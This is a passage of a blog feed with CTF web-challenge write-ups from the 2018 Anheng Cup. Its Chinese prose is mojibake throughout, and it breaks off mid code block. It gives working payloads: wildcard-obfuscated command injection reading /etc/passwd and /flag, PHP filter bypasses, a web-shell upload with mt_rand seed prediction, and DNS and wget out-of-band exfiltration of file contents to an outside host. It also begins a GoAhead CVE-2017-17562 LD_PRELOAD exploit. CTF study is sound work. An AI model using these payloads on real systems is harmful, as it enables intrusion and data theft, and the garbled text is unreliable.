class="line">æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆç»•è¿‡æ­£åˆ™äº†ï¼Œbashé‡Œé¢ç”¨é€šé…ç¬¦ç»•è¿‡å°±å¥½äº†ï¼Œå³</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">cat /etc/passwd #æ›¿æ¢ä¸º</span><br><span class="line">/???/??t /??c/p???w?</span><br></pre></td></tr></table></figure></p><p>å› æ­¤paylaodä¸º<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code> (<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;)</code>, ä¼šå‘ç°phpä»£ç é‡Œé¢çš„æºä»£ç getflagé‚£ä¸€éƒ¨åˆ†çš„å‡½æ•°æ˜¯æ˜¯ä»/flagé‡Œé¢è¯»å–çš„ï¼Œé‚£ä¹ˆæ„é€ <code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>ç›¸å½“äº<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp</title>
      <link href="/ctf-2018%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/"/>
      <url>/ctf-2018%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p>2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›ï¼Œè¢«è€æ¿æ‰¹è¯„â€œåªä¼šå†™æ–‡æ¡£çš„é»‘å®¢â€åï¼Œèµ¶å¿«åˆ·å‡ é¢˜æ‰¾å›ç‚¹è‡ªä¿¡Orzã€‚</p><h1 id="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h1><p>è¿›å…¥é¶æœºï¼Œå¯ä»¥çœ‹åˆ°ç½‘é¡µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><a id="more"></a><p>é¦–å…ˆè¦ç»•è¿‡<code>isset($_GET[&#39;A_A&#39;]) &amp;&amp; strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;)</code>ï¼Œè¡¨é¢ä¸Šè¯´æˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ªGETè¯·æ±‚å¹¶ä¸”å‚æ•°ä¸ºA_Aï¼Œä½†æ˜¯ç¬¬äºŒä¸ªåˆ¤æ–­æœ‰è¦æ±‚GETè¯·æ±‚çš„å‚æ•°ä¸èƒ½ä¸ºA_Aï¼Œçœ‹èµ·æ¥è¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯ç”±äºPHPç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨æ›¿æ¢<code>.</code>ä¸º<code>_</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€  <a href="http://ip/?A.A=xxxæ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚" target="_blank" rel="noopener">http://ip/?A.A=xxxæ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚</a></p><p>æ¥ç€æˆ‘ä»¬éœ€è¦ç»•è¿‡åé¢ä¸¤ä¸ªå¯¹$strçš„åˆ¤æ–­ï¼Œå³ä¿è¯<code>$str&lt;9999999999 || (string)$str&gt;0==false</code>ï¼Œè¿™çœ‹èµ·æ¥å†™æ˜¯ä¸å¯èƒ½ï¼Œä½†æ˜¯åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿$strä¸ºä¸€ä¸ªæ•°ç»„ï¼Œç”±äºç±»å‹ä¸åŒæ— æ³•åˆ¤æ–­/å¼ºåˆ¶è½¬åŒ–ï¼Œå› æ­¤è¿™æ ·ä¸¤ä¸ªåˆ¤æ–­å°±éƒ½ä¸æˆç«‹äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¼€å¿ƒçš„getflagäº†ã€‚æœ€åçš„GETè¯·æ±‚ä¸º<code>http://114.55.36.69:8022/?A.A[]=1</code></p><h1 id="pingä¹Ÿèƒ½æŠŠä½ pingæŒ‚"><a href="#pingä¹Ÿèƒ½æŠŠä½ pingæŒ‚" class="headerlink" title="pingä¹Ÿèƒ½æŠŠä½ pingæŒ‚"></a>pingä¹Ÿèƒ½æŠŠä½ pingæŒ‚</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>è¿›å…¥é¶æœºï¼Œè·³è½¬åˆ°pingçš„é¡µé¢ï¼ŒçŒœæµ‹æœ‰å‘½ä»¤æ³¨å…¥çš„é—®é¢˜</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537705876135.png" alt="1537705876135"></p><p>å°è¯•åå‘ç°<code>;</code>ï¼Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¹¶ä¸”é•¿åº¦å­˜åœ¨é™åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬åªèƒ½ç”¨lså…ˆçœ‹ä¸‹å½“å‰ç›®å½•æœ‰å•¥ä¸œè¥¿äº†ï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537705979278.png" alt="1537705979278"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†ä¸Šä¼ å…¥å£ï¼šyou_find_upload.phpã€‚</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>è¿›å…¥<a href="http://114.55.36.69:6664/you_find_upload.phpï¼Œçœ‹åˆ°å¯ä»¥æŸ¥çœ‹æºç ï¼Œé‚£å°±ç‚¹è¿›å»æŸ¥çœ‹å§" target="_blank" rel="noopener">http://114.55.36.69:6664/you_find_upload.phpï¼Œçœ‹åˆ°å¯ä»¥æŸ¥çœ‹æºç ï¼Œé‚£å°±ç‚¹è¿›å»æŸ¥çœ‹å§</a></p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537706140903.png" alt="1537706140903"></p><p>å‰é¢é‚£ä¸€ä¸²æ•°å­—å…ˆä¸ç®¡ï¼Œå°†åé¢çš„base64è§£ç ï¼Œå¾—åˆ°ä¸Šä¼ çš„æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type = <span class="keyword">array</span>(<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</span><br><span class="line">mt_srand((time() % rand(<span class="number">1</span>,<span class="number">100000</span>)%rand(<span class="number">1000</span>,<span class="number">9000</span>)));</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $check = getimagesize($FILES<span class="string">'file'</span>);</span><br><span class="line">    @$extension = end(explode(<span class="string">'.'</span>,$FILES<span class="string">'file'</span>));</span><br><span class="line">    <span class="keyword">if</span>(in_array($extension,$type))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'File is an image - '</span> . $check[<span class="string">'mime'</span>];</span><br><span class="line">        $filename = mt_rand().<span class="string">''</span>.$FILES<span class="string">'file'</span>;</span><br><span class="line">        move_uploaded_file($FILES<span class="string">'file'</span>, $filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(@preg_match(<span class="string">"/..\//"</span>,$GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä½ è¿™ä¸ªå­©å­ï¼Œtoo young too simple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">       @<span class="keyword">include</span> $_GET[<span class="string">'p'</span>].<span class="string">".php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡æ–‡ä»¶ç±»å‹é™åˆ¶ï¼Œ<code>in_array($extension,$type)</code>è¡¨ç¤ºæˆ‘ä»¬å¾—ä¸Šä¼ åç¼€æ˜¯gifï¼Œjpgæˆ–pngçš„æ–‡ä»¶ï¼Œè¿™é‡Œå¤ä¹ ä¸€ä¸‹ä¸Šä¼ ç»•è¿‡çš„æ™®é€šå¥—è·¯ï¼š</p><ol><li><p>Apache</p><p>1.php.jpg #ä»apacheä»å³å¾€å·¦ï¼Œç›´åˆ°å¯è§£æçš„æ–‡ä»¶åç¼€</p></li><li><p>Nginx</p><p>1.php%001.jpg #00å¤„æˆªæ–­</p></li><li><p>IIS</p><p>a.asp;jpg    </p><p>a.php. å’Œa.php[ç©ºæ ¼] #ä¼šè‡ªåŠ¨å»æ‰ç©ºæ ¼</p></li></ol><p>æ³¨æ„åˆ°è¿™é‡Œç”¨çš„æ˜¯Apacheå®¹å™¨ï¼Œé‚£æˆ‘ä»¬å°±ä¸Šä¼ ä¸ªbackdoor.php.jpgæ–‡ä»¶å°±å¥½äº†</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537706584108.png" alt="1537706584108"></p><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»ä¸Šä¼ æˆåŠŸäº†</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç¡®å®šä¸Šä¼ åçš„æ–‡ä»¶åï¼Œå†æ¬¡æŸ¥çœ‹æºç ï¼Œç‚¹å‡»ä¸Šä¼ åï¼Œç¨‹åºé¦–å…ˆä½¿ç”¨<code>mt_srand((time() % rand(1,100000)%rand(1000,9000)));</code>è®¾ç½®äº†éšæœºæ•°ç§å­ï¼Œå¹¶ä¸”æ‰“å°ç¬¬ä¸€ä¸ªéšæœºæ•°<code>echo mt_rand();</code>ï¼›è€Œä¸Šä¼ æ–‡ä»¶åå°±æ˜¯ç¬¬äºŒä¸ªéšæœºæ•°+åŸæœ¬æ–‡ä»¶å<code>$filename = mt_rand().&#39;&#39;.$FILES&#39;file&#39;;</code>ï¼Œè¿™æ ·çš„ä¼ªéšæœºæ•°æ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç¬¬ä¸€ä¸ªéšæœºæ•°æš´åŠ›ç ´è§£å‡ºéšæœºæ•°ç§å­ï¼ˆæ³¨æ„åˆ°è¿™é‡Œçš„ç§å­âˆˆ[1000,9000]ï¼‰ï¼Œç„¶åå†è®¡ç®—å‡ºç¬¬äºŒä¸ªéšæœºæ•°ã€‚</p><p>ä»¥ç¬¬3æ­¥çš„ä¸Šä¼ ç»“æœä¸ºä¾‹ï¼Œä½¿ç”¨php_mt_seed.exeè®¡ç®—å‡ºéšæœºæ•°ç§å­ä¸º5240.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Î» php_mt_seed.exe 823735129</span><br><span class="line">Found 0, trying 0 - 33554431, speed 0 seeds per second</span><br><span class="line">seed = 5240</span><br><span class="line">Found 1, trying 67108864 - 100663295, speed 71014670 seeds per second</span><br></pre></td></tr></table></figure><p>æ¥ç€æ¨æµ‹å‡ºç¬¬äºŒä¸ªéšæœºæ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Î» cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line">mt_srand(5240);</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br><span class="line">Î» php test.php</span><br><span class="line">823735129</span><br><span class="line">288373614</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ–‡ä»¶åå°±æ˜¯288373614_backdoor.php.jpg</p><p>åé¢å°±å¯ä»¥è¿èœåˆ€<a href="http://114.55.36.69:6664/upload/288373614_backdoor.php.jpgï¼Œflagåœ¨æ ¹ç›®å½•" target="_blank" rel="noopener">http://114.55.36.69:6664/upload/288373614_backdoor.php.jpgï¼Œflagåœ¨æ ¹ç›®å½•</a></p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537707585778.png" alt="1537707585778"></p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>è¿™é¢˜ç®—æ˜¯çœ‹ç€ç­”æ¡ˆåšå‡ºæ¥çš„ï¼Œä¸è¿‡æ€è·¯å¾ˆå¥½ï¼Œç”¨åˆ°äº†DNSå¸¦å¤–æ•°æ®çš„çŸ¥è¯†ï¼Œè¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸‹ï¼š</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>é¦–å…ˆè¿˜æ˜¯æ‰«æç½‘ç«™ï¼Œå¯ä»¥çœ‹åˆ°ç½‘ç«™æ³„éœ²äº†ä¸€ä¸ªrobots.txtæ–‡ä»¶</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537792599445.png" alt="1537792599445"></p><p>è®¿é—®è¯¥æ–‡ä»¶ï¼Œçœ‹åˆ°ç›®å½•ä¸‹å­˜åœ¨index.txtï¼Œwhere_is_flag.phpæ–‡ä»¶</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537792801839.png" alt="1537792801839"></p><p>å…ˆçœ‹index.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"where_is_flag.php"</span>);<span class="keyword">echo</span> <span class="string">"ping"</span>;$ip =(string)$_GET[<span class="string">'ping'</span>];$ip =str_replace(<span class="string">"&gt;"</span>,<span class="string">"0.0"</span>,$ip);system(<span class="string">"ping  "</span>.$ip);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œpingå‚æ•°ä¼šç›´æ¥æ‹¼æ¥åœ¨pingå‘½ä»¤å</p><p>where_is_flag.phpæˆ‘ä»¬éœ€è¦ç”¨å‘½ä»¤æ‰§è¡Œæ‰èƒ½çœ‹äº†ã€‚</p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>å°è¯•ä½¿ç”¨<code>http://114.55.36.69:8015/?ping=127.0.0.1</code>ï¼Œå‘ç°ç½‘ç«™æœªå“åº”ï¼Œè¿™æ˜¯å› ä¸ºåå°æ­£åœ¨å¾ªç¯pingï¼Œè¯´æ˜äº†å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><p>æ¥ç€å°è¯•ä½¿ç”¨<code>http://114.55.36.69:8015/?ping=-c 1 127.0.0.1</code>ï¼Œå¯ä»¥å‘ç°ç½‘ç«™ç½‘ç«™åå°å¹¶æ²¡æœ‰å›æ˜¾pingçš„ç»“æœï¼Œè¿™è¯´æ˜è™½ç„¶ç½‘ç«™æ‰§è¡Œäº†å‘½ä»¤ï¼Œä½†æ˜¯å¹¶ä¸è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœã€‚</p><p>é‚£ä¹ˆå¦‚ä½•æ‹¿åˆ°å‘½ä»¤æ‰§è¡Œç»“æœå‘¢ï¼Ÿç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯ä½¿ç”¨httpè¯·æ±‚ï¼Œæ¯”å¦‚è¯´<code>wget www.mysite.com/$(cat flag.php)</code>ï¼Œä½†æ˜¯å°è¯•åå‘ç°æ— æ•ˆï¼Œè¿™å¯èƒ½æ˜¯æœåŠ¡å™¨å¹¶æ²¡æœ‰wgetå‘½ä»¤ã€‚</p><p>æ­£è§£æ˜¯ä½¿ç”¨dnsè§£æè·å–å¸¦å¤–æ•°æ®ï¼Œè¿™é‡Œæ¨èä¸€ä¸ªå¹³å°ï¼š<a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a>ï¼Œç™»å½•ä¹‹åå¯ä»¥è·å¾—ä¸€ä¸ªä¸“å±çš„åœ°å€ï¼ˆå‡è®¾ä¸ºqwerty.ceye.ioï¼‰ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬<code>ping  &#96;whoami&#96;.qwerty.ceye.io</code>ï¼Œç”±äºpingçš„ç¬¬ä¸€æ­¥æ˜¯dnsè§£æï¼Œæ‰€ä»¥åœ¨<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a>å°±å¯ä»¥çœ‹whoamiå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537793445399.png" alt="1537793445399"></p><p>æ ¹æ®ä¸Šè¿°åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥è·å–where_is_flag.phpï¼Œä½†æ˜¯å¦‚æœæ–‡ä»¶å†…å®¹ä¸­æœ‰ç©ºæ ¼ï¼Œæˆ‘ä»¬çš„pingå‘½ä»¤å°±ä¸èƒ½æ‰§è¡Œäº†ï¼Œæ‰€ä»¥ç”¨sedå‘½ä»¤å°†ç©ºæ ¼æ¢æˆsspaceeã€‚è¿™æ ·æˆ‘ä»¬pingå‚æ•°ä¸ºï¼š<br><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat where_is_flag.php|sed â€˜s/\s/sspacee/gâ€™&#96;.0ri9zr.ceye.io</code></p><p>åŒæ—¶åœ¨ceyeä¸­å¯ä»¥çœ‹åˆ°æ–‡ä»¶å†…å®¹äº†</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537792741495.png" alt="1537792741495"></p><p>æ¥ç€è®¿é—®dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.phpï¼Œå¦‚æ³•ç‚®åˆ¶å³å¯ï¼š</p><p><code><a href="http://114.55.36.69:8015/?ping=" target="_blank" rel="noopener">http://114.55.36.69:8015/?ping=</a> &#96;cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed â€˜s/\s/sspacee/gâ€™&#96;.0ri9zr.ceye.io</code></p><p>å¯ä»¥çœ‹åˆ°flagï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1537793298457.png" alt="1537793298457"></p><p><strong>æ‹“å±•ï¼š</strong> ä¸æ­¢æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œdnsçš„å¸¦å¤–æ•°æ®è¿˜èƒ½ä¼ å¾ˆå¤šä¸œè¥¿æ¯”å¦‚è¯´SQLæ³¨å…¥ã€XXEï¼Œè¯¦ç»†å¯ä»¥çœ‹<a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a>ï¼ŒGithubä¸Šä¹Ÿæœ‰äº†åˆ©ç”¨è¯¥æ–¹æ³•è¿›è¡ŒSQLæ³¨å…¥çš„å·¥å…·ï¼ˆ<a href="https://github.com/ADOOO/DnslogSqlinj" target="_blank" rel="noopener">https://github.com/ADOOO/DnslogSqlinj</a>)</p><h1 id="ProxyError"><a href="#ProxyError" class="headerlink" title="ProxyError"></a>ProxyError</h1><p>ä¿®æ”¹Host:192.168.5.132</p><h1 id="æ–°ç“¶è£…æ—§é…’"><a href="#æ–°ç“¶è£…æ—§é…’" class="headerlink" title="æ–°ç“¶è£…æ—§é…’"></a>æ–°ç“¶è£…æ—§é…’</h1><h2 id="0x01-ä»£ç å®¡è®¡-æ–‡ä»¶ä¸Šä¼ "><a href="#0x01-ä»£ç å®¡è®¡-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x01 ä»£ç å®¡è®¡+æ–‡ä»¶ä¸Šä¼ "></a>0x01 ä»£ç å®¡è®¡+æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°éœ€è¦ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539350142198.png" alt="1539350142198"></p><p>è¿™é‡Œçœ‹åˆ°zipæ–‡ä»¶ä¸­éœ€è¦åŒ…å«ä¸€ä¸ªå›¾ç‰‡åç¼€ï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539350155700.png" alt="1539350155700"></p><p>æ ¹æ®apacheçš„ç‰¹æ€§ï¼Œä½¿ç”¨å¤§é©¬1.pHp.png(æ³¨æ„åˆ°æ–‡ä»¶åä¸èƒ½æœ‰<code>.ph</code>)ï¼Œå¹¶ä¸”å‹ç¼©æˆzipä¸Šä¼ ï¼Œå‘ç°<code>flag.php</code>ã€‚</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1539350804776.png" alt="1539350804776"></p><h1 id="GOGOGO"><a href="#GOGOGO" class="headerlink" title="GOGOGO"></a>GOGOGO</h1><h2 id="0x01-GoAhead-CVE-2017-17562"><a href="#0x01-GoAhead-CVE-2017-17562" class="headerlink" title="0x01 GoAhead CVE-2017-17562"></a>0x01 GoAhead CVE-2017-17562</h2><p>å®é™…ä¸Šè…¾è®¯çš„<a href="https://slab.qq.com/news/tech/1701.html" target="_blank" rel="noopener">â€œå¼€æºWebæœåŠ¡å™¨GoAheadæ¼æ´CVE-2017-17562åˆ†æâ€œ</a> ä¸€æ–‡å·²ç»å¯¹æ­¤æ¼æ´è¿›è¡Œäº†è¯¦ç»†è§£é‡Šï¼Œè¿™é‡Œåªæ¦‚æ‹¬çš„è¯´ä¸€ä¸‹ï¼š</p><ol><li>å› ä¸ºcgiHandlerçš„è¿‡æ»¤ä¸å½“ï¼Œå¯¼è‡´LD_PRELOADå˜é‡å¯æ§ï¼Œè€Œç¨‹åºä¼šè¯»å–LD_PRELOADå˜é‡è®°å½•çš„æ–‡ä»¶è·¯å¾„å¹¶ä¸”æ‰§è¡Œæ–‡ä»¶ä»£ç ï¼›</li><li>launchCgiå‡½æ•°è°ƒç”¨ç³»ç»Ÿå‡½æ•°dup2()å°†stdinæ–‡ä»¶æè¿°ç¬¦æŒ‡å‘äº†POSTè¯·æ±‚æ•°æ®å¯¹åº”çš„ä¸´æ—¶æ–‡ä»¶ã€‚</li></ol><p>ä»å‘é€payloadçš„å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„POSTä¸­æ§åˆ¶äº†ä¸¤ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªæ˜¯LOAD_PRELOADå‚æ•°ï¼ˆå°†å®ƒè®¾ç½®ä¸ºäº†/proc/self/fd/0ï¼‰ï¼Œä¸€ä¸ªæ˜¯POSTçš„dataï¼ˆå°†å®ƒè®¾ç½®ä¸ºäº†æˆ‘ä»¬ç¼–è¯‘ç”Ÿæˆçš„åŠ¨æ€é“¾æ¥åº“ï¼‰ã€‚/proc/self/fd/0 æ˜¯Linuxçš„ä¼ªæ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶ï¼Œå®é™…ä¸ŠæŒ‡çš„æ˜¯stdinï¼Œä»¥ä¸‹å‘½ä»¤çš„æ‰§è¡Œç»“æœå¯ä»¥è¯´æ˜è¿™ä¸€ç‚¹ï¼š</p><p><img src="/ctf-2018â€œå®‰æ’æ¯â€WEBå®‰å…¨æµ‹è¯•ç§‹å­£èµ„æ ¼èµ›wp/1538571783966.png" alt="1538571783966"></p><p>è¿™æ ·ç»“åˆç¬¬ä¸€æ¡ï¼Œå³ç¨‹åºä¼šä»æˆ‘ä»¬æ ‡å‡†è¾“å…¥ä¸­å–ä»£ç æ‰§è¡Œï¼Œåˆå› ä¸ºç¬¬äºŒæ¡ï¼Œæˆ‘ä»¬çš„æ ‡å‡†è¾“å…¥è¢«å®šå‘åˆ°äº†POSTçš„ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå…·ä½“æ¥è¯´ï¼Œå³å®šå‘åˆ°äº†æˆ‘ä»¬çš„payload.soæ–‡ä»¶ä¸Šï¼Œè¿™æ ·æ•´ä¸ªåŸç†å°±èµ°é€šäº†ã€‚</p><h2 id="0x02-å¤ç°CVE"><a href="#0x02-å¤ç°CVE" class="headerlink" title="0x02 å¤ç°CVE"></a>0x02 å¤ç°CVE</h2><p>å‡†å¤‡payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 